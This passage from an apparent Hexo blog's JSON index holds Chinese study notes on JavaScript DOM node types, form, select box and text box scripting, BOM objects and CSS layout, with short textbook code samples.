MutationObserver((mutationRecords)=&gt;console.log(mutationRecords));observer.observe(document.body,&#123;attributes:true&#125;);document.body.className=&#x27;foo&#x27;;document.body.className=&#x27;bar&#x27;;console.log(observer.takeRecords());console.log(observer.takeRecords());//[MutationRecord, MutationRecord]//[]","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"DOM-节点层级","slug":"DOM-节点层级","date":"2021-12-12T09:13:55.000Z","updated":"2022-01-24T08:14:25.394Z","comments":true,"path":"2021/12/12/DOM-节点层级/","link":"","permalink":"https://coloey.github.io/2021/12/12/DOM-%E8%8A%82%E7%82%B9%E5%B1%82%E7%BA%A7/","excerpt":"","text":"Node类型DOM Level 描述为名为Node的接口，Node接口在JavaScript中被实现为Node类型，所有结点都继承Node类型，因此所有类型都共享相同的基本属性和方法。 节点类型可通过与这些常量比较来确定 12345678//节点类型可通过与这些常量比较确定，如果两者相等，则意味着someNode是一个元素节点if(someNode.nodeType==Node.ELEMENT_NODE)&#123; alert(&quot;Node is an element&quot;);&#125;//nodeName和nodeValue保存着有关节点的信息if(someNode.nodeType==1)&#123; value=someNode.nodeName;//会显示元素的标签名&#125; 节点关系节点与其他节点的关系可形容为家族关系，每个节点有一个childNodes属性其中包含一个NodeList的实例，NodeList是一个类数组对象，它是DOM结构的查询，DOM结构的变化会自动地在NodeList中反映出来，用于存储可以按位置存取的有序节点。可以使用中括号或者item()方法访问它的值 1234let firstChild=someNode.childNodes[0];let secondChild=someNode.childNodes.item(1);let count=someNode.childNodes.length;let arrayofNodes=Array.from(someNode.childNodes); parentNode指向DOM树中的父元素，childNode中所有节点都有同一个父元素，parentNode指向同一个节点，childNodes列表中每个结点都是同一列表中其他节点的同胞节点，使用previousSibling和nextSibling可以在这个列表的节点间导航。 hasChildNodes()节点返回true则说明节点有一个或多个子节点。 ownerDocument属性是一个指向代表整个文档的文档节点的指针 操纵节点appendChild():用于在childNodes列表末尾添加节点，返回新添加的节点。 123let returnedNode=someNode.appendChild(newNode);alert(returnedNode==newNode);//truealert(someNode.lastChild==newNode);//true inserBefore():接收两个参数，要插入的节点和参照节点。要插入的节点会变成参照节点的前一个同胞节点，并被返回 12345678910returnedNode=someNode.insertBefore(newNode,null);alert(newNode==someNode.lastChild);//true//作为新的第一个子节点插入retunedNode=someNode.insertBefore(newNode,someNode.firstChild);alert(returnedNode==newNode);//truealert(newNode==someNode.fiestChild);//true//插入最后一个子节点的前面returnedNode==someNode.insertBefore(newNode,someNode.lastChild);alert(newNode==someNode.childNodes[someNode.childNodes.length-2]);//true replaceChild():接收两个参数，要插入的节点和要替换的节点。要替换的节点被返回并从文档中被移除 1returnedNode=someNode.replaceChild(newNode,someNode.lastChild);//替换最后一个子节点 removeChild():接收一个参数，即要被移除的节点，被移除的节点会被返回 1let formerFirstChild=someNode.removeChild(someNode.firstChild); cloneNode():传入true参数会进行深复制，即复制节点和整个子DOM树；传入false进行浅复制，只会复制该方法的节点。复制返回的节点属于文档所有，但未指定父节点，称为孤儿节点，通过appendChild()和insertBefore()，replaceChild()方法把孤儿节点添加到文档中 normalize():处理文本节点，如果发现空文本节点则将其删除否则如果两个同胞节点相邻则将其合并为一个文本节点 Document类型表示文档节点的类型,document是HTMLDocument的实例（HTMLDocument继承Document）,表示整个HTML页面，document是window对象的属性是一个全局对象。 nodetype等于9 nodeName值为“#document” nodevalue值为null parentNode值为null ownerDocument值为null 子节点可以使DocumentType(最多一个)，Element(最多一个)，ProcessingInstruction或Comment类型 文档子节点documentElement:始终指向HTML页面中的元素 1234567&lt;html&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;let html=document.documentElement;//取得对&lt;html&gt;的引用alert(html===document.childNodes[0]);alert(html===document.firstChild); document.body:直接指向body元素，取得对body的引用 文档信息title:显示浏览器窗口或标签页的标题栏 URL:包含当前页面的完整URL domain:包含页面的域名 referrer:包含空字符串 123//document.URL=&quot;http://www.wrox.com/WileyCDA/&quot;,document.domain就是www.wrox.comdocument=&quot;wrrox.com&quot;;//成功document=&quot;nczonline.net&quot;;//出错,不能给这个属性设置URL中不包含的值 当页面中包含来自某个不同子域的窗格（)或内嵌窗格()设置document.domain是有用的，比如一个加载自www.wrox.com的页面包含一个内嵌窗格其中的页面加载自p2p.wrox.com，这两个页面包含不同的字符串，内部和外部不能相互访问对方的JavaScript对象，如果每个页面都把document.domain设置为wrox.com,那两个页面就可以相互通信 12document.domain=&quot;wrox.com&quot;;//放松，成功document.doman=&quot;p2p2.wrox.com&quot;;//收紧，失败,一旦放松就不能收紧 定位元素getElementById()：接收一个要获取元素的ID，如果找到这个元素则返回，没找到返回null。参数I必须跟元素在页面中大的id属性完全匹配，包括大小写 12&lt;div id=&quot;myDiv&quot;&gt;ome text&lt;/div&gt;let div=document.getElementById(&quot;myDiv&quot;);//取得对&lt;div&gt;的引用,如果存在多个相同ID的元素则返回在文档中的第一个元素 getElementsByTagName():接收一个参数，即要获取元素的标签名,返回包含0个或多个元素的NodeList，在HTML文档中返回一个HTMLCollection对象 12345678910let images=document.getElementsByTagName(&quot;img&quot;);alert(images.length);//图片数量alert(images[0].src);//第一张图片的src属性alert(images.item(0).src);//通过name属性获得引用&lt;img src=&quot;myImage.gif&quot; name=&quot;myImage&quot;&gt;;let myImage=images.namedItem(&quot;myImage&quot;);//images[&quot;myImage&quot;]//取得文档的所有元素let allElements=document.getElementsByTagName(&quot;*&quot;); getElementsByName():返回具有给定name属性的所有元素，常用于单选按钮 12345678910&lt;fieldset&gt; &lt;legend&gt;Which color do you prefer?&lt;/legend&gt; &lt;ul&gt; &lt;li&gt; &lt;input type=&quot;radio&quot; value=&quot;red&quot; name=&quot;color&quot; id=&quot;colorRed&quot;&gt;&lt;label for=&quot;colorRed&quot;&gt;Red&lt;/label&gt; &lt;/li&gt; &lt;li&gt; &lt;input type=&quot;radio&quot; value=&quot;blue&quot; name=&quot;color&quot; id=&quot;colorBlue&quot;&gt;&lt;label for=&quot;colorBlue&quot;&gt;Blue&lt;/label&gt; &lt;/li&gt; let radios=document.getElementsByName(&quot;color&quot;); Element类型 nodeType=1 nodeName值为元素的标签名 nodeValue的值为null parentNode值为Document或Element对象 子节点可以是Element,Text,Comment,ProcessingInstruction等类型 通过nodeName或tagName属性获得元素的标签名 1234567891011121314151617181920//使用对象属性&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;myDiv&quot;&gt;&lt;/div&gt; &lt;script&gt; let div=document.getElementById(&quot;myDiv&quot;); alert(div.tagName);//&quot;DIV&quot; alert(div.tagName==div.nodeName);//true if(element.tagName.toLowerCase()==&quot;div&quot;)&#123; //,HTML中，元素标签名以答谢表示，XML中标签名与代码中的大小写一致，不确定脚本是HTML还是XML运行，推荐将标签名转换为小写形式，适合所有文档 &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; HTML元素 id:元素在文档中的唯一标识符 title：包含元素的额外信息，通常以提示条形式展示 lang：元素内容的语言代码 dir：语言的书写方向（ltr从左到右，rtl从右到左) className:相当于class属性，用于指定元素的CSS类 取得属性1234567891011121314151617181920212223//使用对象属性&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;myDiv&quot; class=&quot;bd&quot; title=&quot;Body text&quot; lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;2&lt;/div&gt; &lt;script&gt; var div=document.getElementById(&quot;myDiv&quot;); alert(div.id); alert(div.className); alert(div.title); alert(div.lang); alert(div.dir); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;//使用getAttribute()方法alert(div.getAttribute(&quot;class&quot;)); getAttribute()主要用于取得自定义属性的值，其他情况使用对象属性 设置属性setAttribute():接收两个参数，要设置的属性名和属性值,如果属性存在则用指定的值替换原来的值 1234567//直接给对象属性赋值div.id=&quot;someOtherId&quot;//在对象属性上添加自定义属性，不会让它变成元素的属性div.mycolor=&quot;red&quot;;alert(div.getAttribute(&quot;mycolor&quot;));//null//使用setAttribute赋值div.setAttribute(&quot;id&quot;,&quot;someOtherId&quot;); attributes属性attributes属性包含一个NamedNodeMap实例，是一个类似NodeList的“实时”集合，元素的每个属性都表示为一个Attr节点，并保存在NamedNodeMap对象中 attributed属性中的每个节点的nodeName是对应属性的名字，nodeValue是属性的值 12345678function outputAttributes(element)&#123; let pairs=[]; for(let i=0,len=element.attributes.length;i&lt;len;++i)&#123; const attribute=element.attributes[i]; pairs.push(`$&#123;attribute.nodeName&#125;=$&#123;attribute.nodeValue&#125;`); return pairs.join(&quot; &quot;); &#125;&#125; 创建元素document.createElement():一个参数，即要创建元素的标签名 1234let div=document.createElement(&quot;div&quot;);div.id=&quot;myNewDiv&quot;;div.className=&quot;box&quot;;document.body.appendChild(div); Text 类型Text节点由Text类型表示，包含按字面解释的纯文本，也可能包含转义后的HTML字符，Text节点中包含的文本可以通过nodeValue或者data属性访问 nodetype=3 nodeName=”#text” nodeValue值为节点中包含的文本 parentNode值为Element对象 不支持子节点 appendData(text):向节点末尾添加文本text deleteData(offset,count),从位置offset开始删除count个字符 insertData(offset,text),在位置offset插入text； replaceData(offset,count,text)，用text替换从位置offset到offset+count大的文本 splitText(offset),在位置offset将当前文本节点拆分为两个文本节点 substringData(offset,count),提取从位置offset到offset+count的文本 包含文本内容的每个元素最多只能有一个文本节点 创建文本节点document.createTextNode():创建新文本节点，接收一个参数，即要插入节点的文本 123456789let element=document.createElement(&quot;div&quot;);element.className=&quot;message&quot;;let textNode=document.createTextNode(&quot;Hello world!&quot;);element.appendChild(textNode);let anotherTextNode=document.createTextNode(&quot;Yippee&quot;);element.appendChild(anotherTextNode);document.body.appendChild(element); 规范化文本节点合并文本节点1234567891011let element=document.createElement(&quot;div&quot;);element.className=&quot;message&quot;;let textNode=document.createTextNode(&quot;Hello World&quot;);element.appendChild(textNode);let anotherTextNode=document.createTextNode(&quot;Yippee&quot;);element.appendChild(anotherTextNode);document.body.appendChild(element);alert(element.childNodes.length);//2element.normalize();alert(element.childNodes.length);//1alert(element.firstChild.nodeValue); 拆分文本节点12345678910let element=document.createElement(&quot;div&quot;);element.className=&quot;message&quot;;let textNode=document.createTextNode(&quot;Hello World&quot;);element.appendChild(textNode);document.body.appendChild(element);let newNode=element.firstChild.splitText(5);alert(element.fiestChild.nodeValue);//&quot;Hello&quot;alert(newNode.nodeValue);//&quot;world&quot;alert(element.chileNodes.length);//2 Comment类型 nodeType=8 nodeName=”#comment” nodeValue值为注释内容 parentNode值为Document或Element对象 不支持子节点 Comment类型与Text类型继承自同一个基类(CharacterData),因此拥有除splitText之外的Text节点所有的字符串操作方法 CDATASection类型继承Text类型，拥有除splitText之外的Text节点所有的字符串操作方法 DocumentType类型 在DOM Level1中不支持动态创建，只能在解析文档代码时创建，DocumentType对象保存在document.doctype属性中. DocumentType对象有3个属性：name,entities,notations. name是文档名称，entities是这个文档类型描述实体的NameNodeMap,而notations是这个文档类型描述的表示法的NamedNodeMap. 浏览器文档通常是HTML或XHTML类型，所以entities和notations列表为空，只有name属性有用，包含文档类型的名称 DocumentFragment类型 nodeType=11 nodeName=”#document-fragment” nodeValue=null parentNode=null 子节点可以是Element,ProcessingInstruction,Comment,Text,CDATASection 充当其他要被添加的文档节点的仓库 123456789&lt;ul id=&quot;myList&quot;&gt;&lt;/ul&gt;let fragment=document.createDocumentFragment();let ul=document.getElementById(&quot;myList&quot;);for(let i=0;i&lt;3;i++)&#123; let li=document.createElement(&quot;li&quot;); li.appendChild(document.createTextNode(`Item $&#123;i+1&#125;`)); fragment.appendChild(li);&#125;ul.appendChild(fragment); Attr类型属性是存在于元素attributes属性中的节点 nodeType=2 nodeName值为属性名 nodeValue值为属性值 parentNode值为null Attr对象上3个属性 name包含属性名 value包含属性值 specified是一个布尔值，表示属性使用的是默认值和还是被指定的值 1234567let attr=document.createAttribute(&quot;align&quot;);//创建新的Attr节点，参数为属性名attr.value=&quot;left&quot;;element.setAttributeNode(attr);//添加属性节点alert(element.attributes[&quot;align&quot;].value);//返回对应属性节点alert(element.getAttributeNode(&quot;align&quot;).value);//返回对应属性节点alert(element.getAttribute(&quot;align&quot;));//只返回属性值","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"选择框编程","slug":"选择框编程","date":"2021-12-12T09:07:36.000Z","updated":"2021-12-30T07:18:26.023Z","comments":true,"path":"2021/12/12/选择框编程/","link":"","permalink":"https://coloey.github.io/2021/12/12/%E9%80%89%E6%8B%A9%E6%A1%86%E7%BC%96%E7%A8%8B/","excerpt":"","text":"选项处理使用选择框的selectedIndex属性 123456789101112131415161718192021222324252627282930 &lt;form method=&quot;post&quot;&gt; &lt;select name=&quot;location&quot; id=&quot;selLocation&quot;&gt; &lt;option value=&quot;Sunnyvalue,CA&quot;&gt;Sunnyvalue&lt;/option&gt; &lt;option value=&quot;Los Angeles,CA&quot;&gt;Los Angeles&lt;/option&gt; &lt;option value=&quot;Mountain View,CA&quot;&gt;Mountain View&lt;/option&gt; &lt;option value=&quot;&quot;&gt;China&lt;/option&gt; &lt;option &gt;Australia&lt;/option&gt; &lt;/select&gt; &lt;/form&gt; &lt;script src=&quot;example3.js&quot;&gt;&lt;/script&gt; let selectbox=document.forms[0].elements[&quot;location&quot;];function getSelectedOptions(selectbox)&#123; let result=new Array(); for(let option of selectbox.options)&#123; if(option.selected)&#123; result.push(option); &#125; &#125; return result;&#125;let selectedOptions=getSelectedOptions(selectbox);let message=&quot;&quot;;for(let option of selectedOptions)&#123; message+=`Selected index:$&#123;option.index&#125;\\n`+`Selected text:$&#123;option.text&#125;\\n`+`Selected value:$&#123;option.value&#125;\\n`;&#125;console.log(message); 添加选项动态创建选项1234let newOption=document.createElement(&quot;option&quot;);newOption.appendChild(document.createTextNode(&quot;Option text&quot;));newOption.setAttribute(&quot;value&quot;,&quot;Option value&quot;);selectbox.appendChild(newOption); 使用Option构造函数创建选项,接收两个参数：text和value，用选择框的add方法添加选项 12let newOption=new Option(&quot;Option text&quot;,&quot;Option value&quot;);selectbox.add(newOption,undefined);//在列表末尾添加选项 移除选项123456789selectbox.removeChild(selectbox.options[0]);//移除第一项selectbox.remove(0);//移除第一项selectbox.options[0]=null;//清除选项框的所有选项function clearSelectbox(selectbox)&#123; for(let option of selectbox.options)&#123; selectbox.remove(0); &#125;&#125; 移动和重排选项1234let selectbox1=document.getElementById(&quot;selLocations1&quot;);let selectbox2=document.getElementById(&quot;selLocations2&quot;);selectbox2.appendChild(selectbox1.options[0]);//将选项从第一个选择框移动到另一个选择框 重排选项 123456let selectbox1=document.getElementById(&quot;selLocations1&quot;);let optionToMove=selectbox1.options[1];selectbox1.insertBefore(optionToMove,selectbox1.options[optionToMove.index-1]);//将要重排的选项移动到它原先位置的前前面let selectbox1=document.getElementById(&quot;selLocations1&quot;);let optionToMove=selectbox1.options[1];selectbox1.insertBefore(optionToMove,selectbox1.options[optionToMove.index+2]);//将要重排的选项移动到它原先位置的后面一位","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"文本框编程","slug":"文本框","date":"2021-12-09T12:46:20.000Z","updated":"2021-12-30T07:18:16.782Z","comments":true,"path":"2021/12/09/文本框/","link":"","permalink":"https://coloey.github.io/2021/12/09/%E6%96%87%E6%9C%AC%E6%A1%86/","excerpt":"","text":"文本框编程表示文本框的两种方式123456&lt;input type=&quot;text&quot; size=&quot;25&quot; maxlength=&quot;50&quot; value=&quot;initial value&quot;&gt; //创建多行文本框 &lt;textarea rows=&quot;25&quot; cols=&quot;5&quot;&gt;initial value&lt;/textarea&gt;//用使用value属性读写文本框let textbox=document.forms[0].elements[&quot;textbox1&quot;];textbox.value=&quot;Some new value&quot;; 选择文本select()用于全选文本 123456let form=document.getElementById(&quot;myForm&quot;); let textbox=form.elements[0]; textbox.addEventListener(&quot;focus&quot;,(event)=&gt;&#123; event.target.select(); console.log(`Text selected:$&#123;textbox.value&#125;`); &#125;); setSelectionRange()用于部分选择文本 1234567let form=document.getElementById(&quot;myForm&quot;);let textbox=form.elements[0];textbox.addEventListener(&quot;focus&quot;,(event)=&gt;&#123; event.target.select(); textbox.setSelectionRange(0,1); console.log(`Text selected:$&#123;textbox.value&#125;`); &#125;); 屏蔽按键12345textbox.addEventListener(&quot;keypress&quot;,(event)=&gt;&#123; if(!/\\d/.test(String.fromCharCode(event.charCode))&amp;&amp;event.charCode&gt;9&amp;&amp;!event.ctrlKey)&#123;//屏蔽非数字字符但允许同样触发keypress事件的所有基础按键以及ctrl键 event.preventDefault(); &#125;&#125;) 自动切换1234567891011121314151617181920212223242526&lt;form method=&quot;post&quot;&gt; &lt;input type=&quot;text &quot; name=&quot;tel1&quot; id=&quot;textTel1&quot; maxlength=&quot;3&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;tel2&quot; id=&quot;textTel2&quot; maxlength=&quot;3&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;tel3&quot; id=&quot;textTel3&quot; maxlength=&quot;4&quot;&gt; &lt;/form&gt; let inputIds=[&quot;textTel1&quot;,&quot;textTel2&quot;,&quot;textTel3&quot;];for(let id of inputIds)&#123; let textbox=document.getElementById(id); textbox.addEventListener(&quot;keyup&quot;,(event)=&gt;&#123; let target=event.target; if(target.value.length==target.maxLength)&#123; let form=target.form; for(let i=0,len=form.elements.length;i&lt;len;i++)&#123; if(form.elements[i]==target)&#123; if(form.elements[i+1])&#123; form.elements[i+1].focus(); &#125; return; &#125; &#125; &#125; &#125;); &#125;;","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"表单","slug":"表单","date":"2021-12-09T12:11:33.000Z","updated":"2021-12-30T07:17:44.744Z","comments":true,"path":"2021/12/09/表单/","link":"","permalink":"https://coloey.github.io/2021/12/09/%E8%A1%A8%E5%8D%95/","excerpt":"","text":"表单禁用表单避免多次提交表单可以在第一次点击后禁用表单 12345678let form=document.getElementById(&quot;myForm&quot;);form.addEventListener(&quot;submit&quot;,(event)=&gt;&#123; let target=event.target; //取得提交按钮 let btn=target.elements[&quot;submit-btn&quot;]; //禁用提交按钮 btn.disabled=true;&#125;) focus()把焦点设置到表单字段,这意味着该字段会变成活动字段并可以响应键盘事件,autofocus()会自动为带有该属性的元素设置焦点 12345678let form=document.getElementById(&quot;myForm&quot;);window.addEventListener(&quot;load&quot;,(event)=&gt;&#123; let element=form.elements[0]; if(element.autofocus!==true)&#123; element.focus(); console.log(&quot;JS focus&quot;); &#125; &#125;) 表单的公共事件","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"BOM","slug":"BOM","date":"2021-11-25T12:47:05.000Z","updated":"2021-12-30T07:04:56.946Z","comments":true,"path":"2021/11/25/BOM/","link":"","permalink":"https://coloey.github.io/2021/11/25/BOM/","excerpt":"","text":"BOMlocation对象提供当前窗口加载文档的信息，以及通常的导航功能，它既是window的属性也是document的属性。 查询字符串123456789101112131415161718let getQueryStringArgs=function()&#123; //取得没有开头问号的查询字符串 let qs=(location.search.length&gt;0)?location.search.substring(1):&quot;&quot;; let args=&#123;&#125;; for(let item of(qs.split(&#x27;&amp;&#x27;).map(kv=&gt;kv.split(&#x27;=&#x27;))))&#123; let name=item[0]; value=item[1]; if(name.length)&#123; args[name]=value; &#125; &#125; return args;&#125;//qs=&quot;?q=javaScript&amp;num=10&quot;;let args=getQueryStringArgs();alert(args[&quot;q&quot;]);alert(args[&#x27;num&#x27;]); 使用USLSearchParams检查和修改查询字符串 123456789101112let qs=&quot;?q=javaScript&amp;num=10&quot;;let searchParams=new URLSearchParams(qs);alert(searchParams.toString());searchParams.has(&quot;num&quot;);searchParams.get(&quot;num&quot;);searchParams.set(&quot;page&quot;,&quot;3&quot;);alert(searchParams.toString());searchParams.delete(&quot;q&quot;);alert(searchParams.toString());for(let param of searchParams)&#123; console.log(param);&#125; 操作地址通过修改location对象修改浏览器地址，使用assign方法传进一个URL,会导航到新URL同时在浏览器历史记录增加一条记录，下面三种方法功能相同 123location.assign(&quot;http://www.wrox.com&quot;);window.location=&quot;http://www.wrox.com&quot;;location.href=&quot;http://www.wrox.com&quot;; 通过修改location属性可以修改当前加载的页面,hash,search,hostname,pathname.port属性被设置为新值后会修改当前的URL 123456789101112//假设当前URL为http://www.wrox.com/WileyCDA/location.assign(&quot;http://www.wrox.com/WileyCDA&quot;);//把URL修改为http://www.wrox.com/WileyCDA/#section1location.hash=&quot;#section1&quot;;//把URL修改为http://www.wrox.com/WileyCDA/?q=javascriptlocation.search=&quot;?q=javascript&quot;;//把URL修改为http://www.somewhere.com/WileyCDA/location.hostname=&quot;www.somewhere.com&quot;;//把URL修改为http://www.somewhere.com/mydir/location.pathname=&quot;mydir&quot;;//把URL修改为http://www.somewhere.com:8080/WileyCDA/location.port=8080; 以上的修改会在浏览器中增加记录，点击后退即可导航到前一个界面，不希望增加历史记录可以使用replace()方法，reload()可以重新加载当前页面，如果页面自从上次请求后没有修改过，则浏览器可能会从缓存中加载页面，如果想强制从服务器中加载，必须传入true history对象history用来导航历史记录，同时不会暴露用户访问过的URL。 12345678history.go(-1);//后退一页history.go(1);//前进一页history.go(&quot;wrox.com&quot;)//导航到最近的wrox.com页面//go有两个简写方法：back()和forward()history.back();//后退一页history.forward()//前进一页//history的length属性记录历史记录有多少条目if(history.length==1)&#123;//这是用户窗口第一个页面&#125; navigator对象navigator对象通常用来确定浏览器的类型 检测插件123456789101112131415161718192021222324252627282930313233343536function hasPlugin(name)&#123; name=name.toLowerCase(); for(let plugin of window.navigator.plugins)&#123; if(plugin.name.toLowerCase().indexOf(name)&gt;-1)&#123;return true;&#125; &#125; return false;&#125;//alert(hasPlugin(&quot;Flash&quot;));//alert(hasPlugin(&quot;QuickTime&quot;));function hasIEPlugin(name)&#123; try&#123; new ActiveXObject(name); return true; &#125;catch(ex)&#123; return false; &#125;&#125;//在所有浏览器中检测插件function hasFlash()&#123; var result=hasPlugin(&quot;Flash&quot;); if(!result)&#123; result=hasIEPlugin(&quot;ShockwaveFlash.ShockwaveFlash&quot;); &#125;return result;&#125;function hasQuickTime()&#123; var res=hasPlugin(&quot;QuickTime&quot;); if(!res)&#123; res=hasIEPlugin(&quot;QuickTime.QuickTime&quot;); &#125; return res;&#125;alert(hasFlash());alert(hasQuickTime()); 注册处理程序registerProtocolHandler()方法可以把一个网站注册处理为某种特定类型信息应用程序，传入3个参数：要处理的协议（“mailto或ftp),处理该协议的URL，以及应用名称 例如，把一个Web应用程序注册为默认客户端 1navigator.registerProtocolHandler(&quot;mailto&quot;,&quot;http://www.somemailclient.com?cmd=%s&quot;,&quot;Some Mail Client&quot;);","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"HTML+CSS","slug":"HTML+CSS","date":"2021-11-25T12:42:24.000Z","updated":"2021-12-30T07:17:34.845Z","comments":true,"path":"2021/11/25/HTML+CSS/","link":"","permalink":"https://coloey.github.io/2021/11/25/HTML+CSS/","excerpt":"","text":"定位：定位总结： static: 不脱标，不能使用边偏移 relative:不脱标（占有位置），可用margin,相对于自身位置移动 absolute:脱标（不占有位置）,不可用margin,带有定位的父级 fixed：脱标（不占有位置），浏览器可视区 sticky:不脱标（占有位置），浏览器可视区 绝对定位特点：如果没有祖先元素或者祖先元素没有定位，则以浏览器为准定位 如果祖先元素有定位（相对，绝对，固定定位）则以最近一级的有定位的祖先元素为参考点移动位置 绝对定位不占有原先的位置（脱标） 叠放次序 z-index在使用定位布局时，可以使用z-index来控制盒子的前后次序 语法： 选择器{z-index:1;} 数值可以是正整数，负整数或者0，默认是auto，数值越大，盒子越靠上 如果属性相同，则按照书写顺序，后来居上 数字后面不能加单位 只有定位的盒子才有z-index属性 定位的拓展1.绝对定位盒子居中 left:50% margin-left:-100px; 2.定位特殊性：绝对定位固定定位和浮动相似 行内元素添加绝对或者固定定位，可以直接设置高度和宽度（span) 块级元素添加绝对或者固定定位，如果不给宽度或者高度，默认大小是内容的大小 脱标的盒子不会触发外边距合并问题 3.绝对定位（固定定位）会完全压住盒子浮动元素只会压住下面标准流的盒子，但是不会压住下面标准流的文字（图片）但是绝对定位（固定定位）会压住下面标准流的所有内容 浮动之所以不会压住下面文字是因为浮动最初的目的是为了做文字环绕效果 元素里的显示和隐藏display 显示隐藏元素 但是不保留位置 隐藏元素不想要原来位置，用none，否则用block visibility显示隐藏元素 但是保留原来的位置,visible为元素可见，hidden为元素隐藏 overflow 溢出显示隐藏 但是只是对于溢出的部分处理,scoll:溢出的部分显示滚动条，visible:溢出部分可见,hidden:溢出部分不可见,auto:没溢出则不显示滚动条，溢出则超出部分显示滚动条。 用户界面样式鼠标样式cursorli &#123;cursor: pointer; &#125; default 默认小白鼠标 pointer 小手 move 移动 text 文本 not-allowed 禁止 vertical-align实现行内块和文字居中对齐vertical-align:middle 解决图片底部默认空白空隙：图片底侧会有一个空白缝隙，原因是行内块元素会和文字的基线对齐解决方法：1.给图片添加vertical-align:middle或者top或者bottom 2.把图片转为块级元素 display:block 单行文字溢出显示省略号white-space:nomal:如果文字显示不开自动换行 white-space:nowrap:如果文字显示不开强制一行内显示 overflow:hidden(溢出部分隐藏) text-overflow:ellipsis(文字溢出部分用省略号显示) 多行文本溢出显示省略号​ width: 150px; ​ height: 65px; ​ background-color: pink; ​ margin: 100px auto; ​ overflow: hidden; ​ text-overflow: ellipsis; ​ display: -webkit-box; ​ /* 从第几行开始省略 */ ​ -webkit-line-clamp: 3; ​ -webkit-box-orient: vertical; 常见布局技巧margin负值使用让每个盒子margin往左移动-1px，正好压住相邻盒子的边框 鼠标经过盒子提高当前盒子层级（如果没有定位，则加相对定位（保留位置）如果都有定位则用z-index) 文字围绕浮动元素三角形制作 weight:0; height:0; border-color:transparent red transparent transprent; border-style:solid; border-width:22px 8px 0 0;(上面的宽，右边的小一些) HTML新标签header:头部标签 nav：导航标签 article:内容标签 section:定义文档某个区域 aside:侧边栏标签 footer：尾部标签 主要针对搜索引擎，这些新标签页面中可以使用多次，在IE9中，需要把这些元素转换为块级元素 视频用mp4格式 autoplay:自动播放 controls:向用户使用播放控件 width:设置播放器宽度 height:设置高度 loop:是否循环播放 src：url（视频url地址） poster:加载等待的画面图片 muted：静音播放 新增input表单type=”email” type=”url” type=”date” type=”time” type=”month” type=”week” type=”numbers” type=”tel” type=”search” type=”color” input属性 required=”requied”表示该内容不能为空，必填 placeholder=”placeholder”提示文本，表单提示信息 autofocus=”autofocus”自动聚焦属性，页面加载完成自动聚焦到指定表单 autocomplete：默认为on，当用户键入字段时基于之前键入的值显示出字段，关闭为off multiple:可以多选文件提交 新增选择器属性选择器E[att]选择具有att属性的E元素 E[att=”val”]选择具有att属性且属性值等于val的E元素 E[att^=”val”]选择具有att属性且属性值以val开头 E[att$=”val”]选择具有att属性且属性值中含有val的E元素 伪类选择器E:first-child:匹配父元素的第一个子元素 E:last-child:匹配父元素的最后一个元素 E:nth-child(n)匹配父元素的第n个元素 E:nth-child(even)匹配父元素的第偶数个元素，odd则第奇数个元素 E:nth-child(n)，从0开始计算，但是第0个元素或者超出元素个数会被忽略 nth-child(2n):偶数，2n+1:奇数 5n:5 10 15… n+5:从第5个开始到最后 -n+5：前5个（包含第5个） nth-of-type():会把指定孩子排序号，执行的时候先看E指定的元素，之后根据E回去看是第几个孩子 nth-child:对于父元素里面所有孩子进行排序选择，先找到第n个孩子，然后看着是否和E匹配 无序列表用nth-child比较多 类选择器，属性选择器和伪类选择器权重为10 伪元素选择器::before:在元素内部的前面插入内容 ::after:在元素内部的后面插入内容 before和after创建一个元素，属于行内元素 新创建的这个元素在文档树中找不到，因此称为伪元素 语法：element::before{}, before和after必须有content属性 伪元素和标签选择器一样，权重为1 伪元素选择器：清除浮动.clearfix:after { content:’’; display:block;//插入的元素必须是块级 height:0;//不要看见这个元素 clear:both; visibility:hidden;//不要看见这个元素 } .clearfix:before,.clearfix:after { content:’’; diaplay:table;//元素在一行显示且转化为块级元素 } CSS盒子模型box-sizing:content-box，盒子大小为width+padding+border(CSS3之前默认) box-sizing:border-box,盒子大小为width 如果盒子模型我们改为了box-sizing：border-box，那padding和border就不会撑大盒子（前提padding和border不会超过width宽度） CSS过渡（重点）transition:要过渡的属性 花费时间 运动曲线 何时开始 1属性：想要变化的CSS属性，宽度高度 背景颜色内外边距都可以 如果想要所有属性都变化过度则用all 2花费时间：单位是秒（必需写单位 3运动曲线默认为ease 4何时开始：单位是秒 可以设置延迟触发时间 默认是0s CSS filter属性修改图片的颜色为黑白 